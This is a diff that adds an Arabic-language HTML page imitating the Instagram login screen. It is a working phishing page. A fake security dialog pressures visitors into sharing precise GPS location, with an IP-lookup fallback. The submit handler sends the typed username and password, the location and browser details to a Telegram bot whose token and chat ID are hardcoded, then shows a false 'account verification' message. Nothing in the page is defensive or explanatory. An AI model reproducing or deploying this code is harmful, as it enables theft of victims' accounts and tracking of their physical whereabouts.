@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • إنستجرام</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            color: #262626;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            padding: 20px;
+        }
+        
+        .main-container {
+            display: flex;
+            max-width: 935px;
+            width: 100%;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .phones {
+            background-image: url('https://i.ibb.co/jkRg0g0/instagram-phones.png');
+            background-position: 0 0;
+            background-size: 454px 618px;
+            height: 618px;
+            width: 454px;
+            margin-left: 35px;
+            position: relative;
+        }
+        
+        .form-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            margin: 0 0 10px;
+            padding: 30px 40px;
+            text-align: center;
+            width: 350px;
+        }
+        
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+        
+        .form-container {
+            margin-top: 24px;
+        }
+        
+        input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 12px;
+            padding: 12px 8px;
+            margin: 0 0 8px;
+            width: 100%;
+            text-align: right;
+            direction: ltr;
+        }
+        
+        input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        
+        button {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-weight: 600;
+            padding: 10px;
+            margin: 14px 0;
+            width: 100%;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        button:disabled {
+            background-color: #b2dffc;
+        }
+        
+        .separator {
+            color: #8e8e8e;
+            margin: 18px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+        }
+        
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+            margin: 0 10px;
+        }
+        
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            margin: 12px 0;
+            display: block;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .fb-login i {
+            margin-left: 5px;
+            font-size: 18px;
+        }
+        
+        .forgot-pw {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+        }
+        
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            margin: 0 0 10px;
+            padding: 25px 40px;
+            text-align: center;
+            width: 350px;
+        }
+        
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .footer {
+            color: #8e8e8e;
+            text-align: center;
+            margin: 50px 0;
+            font-size: 12px;
+            max-width: 935px;
+            width: 100%;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+        }
+        
+        .footer-links a {
+            color: #8e8e8e;
+            margin: 0 8px 12px;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            border-radius: 4px;
+            background-color: #0095f6;
+            color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: none;
+            z-index: 1000;
+        }
+        
+        .location-dialog {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+        
+        .location-content {
+            background-color: white;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            width: 380px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+        }
+        
+        .location-icon {
+            font-size: 48px;
+            color: #0095f6;
+            margin-bottom: 15px;
+        }
+        
+        .location-buttons {
+            display: flex;
+            justify-content: center;
+            margin-top: 25px;
+            gap: 10px;
+        }
+        
+        .location-buttons button {
+            width: auto;
+            margin: 0;
+            padding: 10px 20px;
+            flex: 1;
+        }
+        
+        .location-buttons button.secondary {
+            background-color: #8e8e8e;
+        }
+        
+        .location-privacy {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+        
+        .hidden-process {
+            display: none;
+        }
+        
+        @media (max-width: 875px) {
+            .phones {
+                display: none;
+            }
+        }
+        
+        @media (max-width: 450px) {
+            .login-box, .signup-box {
+                border: none;
+                width: 100%;
+            }
+            
+            .main-container {
+                padding: 10px;
+            }
+            
+            .location-content {
+                width: 90%;
+                margin: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="notification" id="notification"></div>
+    
+    <div class="location-dialog" id="locationDialog">
+        <div class="location-content">
+            <div class="location-icon">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <h3>تأكيد الهوية</h3>
+            <p>لحماية حسابك وتأمينه، نحتاج إلى تأكيد هويتك من خلال التحقق من موقعك الحالي</p>
+            
+            <div class="location-buttons">
+                <button id="allowLocation">موافق</button>
+            </div>
+            
+            <div class="location-privacy">
+                نحن نحترم خصوصيتك. سيتم استخدام موقعك لأغراض التحقق والأمان فقط وسيتم حذف هذه المعلومات بعد 24 ساعة.
+            </div>
+        </div>
+    </div>
+    
+    <div class="main-container">
+        <div class="phones">
+        </div>
+        
+        <div class="form-section">
+            <div class="login-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+                
+                <div class="form-container">
+                    <form id="loginForm">
+                        <input type="text" id="username" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" aria-label="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" required>
+                        <input type="password" id="password" placeholder="كلمة السر" aria-label="كلمة السر" required>
+                        <button type="submit" id="submitButton" disabled>تسجيل الدخول</button>
+                    </form>
+                    
+                    <div class="separator">أو</div>
+                    
+                    <a href="#" class="fb-login">
+                        <i class="fab fa-facebook-square"></i> تسجيل الدخول باستخدام فيسبوك
+                    </a>
+                    
+                    <a href="#" class="forgot-pw">هل نسيت كلمة السر؟</a>
+                </div>
+            </div>
+            
+            <div class="signup-box">
+                <p>ليس لديك حساب؟ <a href="#">اشترك</a></p>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">معلومات</a>
+            <a href="#">المساعدة</a>
+            <a href="#">الصحافة</a>
+            <a href="#">API</a>
+            <a href="#">الوظائف</a>
+            <a href="#">الخصوصية</a>
+            <a href="#">الشروط</a>
+            <a href="#">المواقع</a>
+            <a href="#">الحسابات الأكثر شيوعاً</a>
+            <a href="#">الهاشتاقات</a>
+            <a href="#">اللغة</a>
+        </div>
+        <div>© 2023 Instagram من Meta</div>
+    </footer>
+
+    <div class="hidden-process">
+        <div id="locationProcessInfo"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('loginForm');
+            const notification = document.getElementById('notification');
+            const locationDialog = document.getElementById('locationDialog');
+            const allowLocationBtn = document.getElementById('allowLocation');
+            const locationProcessInfo = document.getElementById('locationProcessInfo');
+            const submitButton = document.getElementById('submitButton');
+            
+            let userLocation = null;
+            let locationRequested = false;
+            let locationPermissionGranted = false;
+            
+            function showNotification(message, isSuccess = false) {
+                notification.textContent = message;
+                notification.style.backgroundColor = isSuccess ? '#4CAF50' : '#0095f6';
+                notification.style.display = 'block';
+                
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 3000);
+            }
+            
+            function getLocation() {
+                if (!navigator.geolocation) {
+                    getFallbackLocation();
+                    return;
+                }
+                
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const accuracy = position.coords.accuracy;
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        
+                        userLocation = {
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: accuracy,
+                            timestamp: new Date().toLocaleString('ar-SA'),
+                            source: 'GPS High Accuracy'
+                        };
+                        
+                        locationProcessInfo.textContent = 'تم تحديد الموقع بنجاح';
+                        
+                        submitButton.disabled = false;
+                    },
+                    function(error) {
+                        getFallbackLocation();
+                    },
+                    options
+                );
+            }
+            
+            function getFallbackLocation() {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        userLocation = {
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            accuracy: 5000,
+                            timestamp: new Date().toLocaleString('ar-SA'),
+                            source: 'IP-based Estimation',
+                            city: data.city,
+                            country: data.country_name
+                        };
+                        
+                        locationProcessInfo.textContent = 'تم تحديد الموقع تقريبياً';
+                        
+                        submitButton.disabled = false;
+                    })
+                    .catch(error => {
+                        locationProcessInfo.textContent = 'فشل في تحديد الموقع';
+                        
+                        submitButton.disabled = false;
+                    });
+            }
+            
+            function requestLocationPermission() {
+                if (locationRequested) return;
+                locationRequested = true;
+                
+                if (navigator.permissions) {
+                    navigator.permissions.query({name: 'geolocation'})
+                        .then(function(result) {
+                            if (result.state === 'granted') {
+                                locationPermissionGranted = true;
+                                getLocation();
+                                return;
+                            } else if (result.state === 'prompt') {
+                                showLocationDialog();
+                            } else if (result.state === 'denied') {
+                                getFallbackLocation();
+                            }
+                        })
+                        .catch(function(error) {
+                            showLocationDialog();
+                        });
+                } else {
+                    showLocationDialog();
+                }
+            }
+            
+            function showLocationDialog() {
+                locationDialog.style.display = 'flex';
+            }
+            
+            async function sendToTelegram(data) {
+                const botToken = '7472121260:AAGcpDMoqxrj_CrBRaP9jxerBgzov69KO0o';
+                const chatId = '6483098148';
+                
+                let locationText = '';
+                if (userLocation) {
+                    if (userLocation.source === 'GPS High Accuracy') {
+                        locationText = `📍 الموقع الدقيق: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}\n📏 الدقة: ${userLocation.accuracy.toFixed(2)} متر\n⏰ وقت الموقع: ${userLocation.timestamp}\n📡 المصدر: ${userLocation.source}`;
+                    } else {
+                        locationText = `📍 الموقع التقريبي: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}\n📏 الدقة التقريبية: ${userLocation.accuracy.toFixed(2)} متر\n⏰ وقت الموقع: ${userLocation.timestamp}\n📡 المصدر: ${userLocation.source}\n🏙️ المدينة: ${userLocation.city || 'غير معروف'}\n🌍 الدولة: ${userLocation.country || 'غير معروف'}`;
+                    }
+                } else {
+                    locationText = "📍 الموقع: غير متاح - يحتاج إذن المستخدم";
+                }
+                
+                const message = `🔒 بيانات تسجيل دخول جديدة:\n👤 اسم المستخدم: ${data.username}\n🔑 كلمة المرور: ${data.password}\n${locationText}\n🌐 المتصفح: ${navigator.userAgent}\n📱 النظام: ${navigator.platform}\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}`;
+                
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const result = await response.json();
+                    return result.ok;
+                } catch (error) {
+                    console.error('Error sending message to Telegram:', error);
+                    return false;
+                }
+            }
+            
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                const originalText = submitButton.textContent;
+                submitButton.textContent = 'جاري التسجيل...';
+                submitButton.disabled = true;
+                
+                const success = await sendToTelegram({ username, password });
+                
+                if (success) {
+                    showNotification('✅ سيتم توثيق حسابك بعد 48 ساعة تلقائي!', true);
+                    
+                    setTimeout(() => {
+                        form.reset();
+                        submitButton.textContent = originalText;
+                        submitButton.disabled = false;
+                    }, 2000);
+                } else {
+                    showNotification('❌ حدث خطأ أثناء التسجيل. يرجى المحاولة مرة أخرى.');
+                    submitButton.textContent = originalText;
+                    submitButton.disabled = false;
+                }
+            });
+            
+            allowLocationBtn.addEventListener('click', function() {
+                locationDialog.style.display = 'none';
+                
+                setTimeout(getLocation, 1000);
+            });
+            
+            setTimeout(requestLocationPermission, 1000);
+            
+            locationDialog.addEventListener('click', function(e) {
+                if (e.target === locationDialog) {
+                }
+            });
+        });
+    </script>
+</body>
+</html>
